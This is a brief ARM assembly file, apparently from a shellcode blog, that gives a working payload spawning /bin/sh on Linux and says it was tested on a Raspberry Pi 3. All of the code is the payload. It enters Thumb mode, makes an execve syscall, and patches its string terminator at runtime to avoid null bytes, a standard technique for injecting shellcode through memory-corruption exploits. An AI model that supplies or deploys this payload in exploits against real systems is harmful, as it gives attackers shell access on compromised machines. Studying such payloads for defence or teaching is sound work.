/**
  execute /bin/sh
  tested with linux running on raspberry pi 3 

  http://modexp.wordpress.com/   
*/

    .global _start
    .text

_start:
    // switch to thumb mode
    .code 32
    add    r3, pc, #1
    bx     r3
    
    .code 16
    // execve("/bin/sh", NULL, NULL);
    adr    r0, sh         // r0 = "/bin/sh"
    eor    r1, r1, r1     // r1 = NULL
    eor    r2, r2, r2     // r2 = NULL
    strb   r2, [r0, #7]   // add null terminator
    mov    r7, #11        // r7 = execve
    svc    1
sh:    
.ascii "/bin/shX"
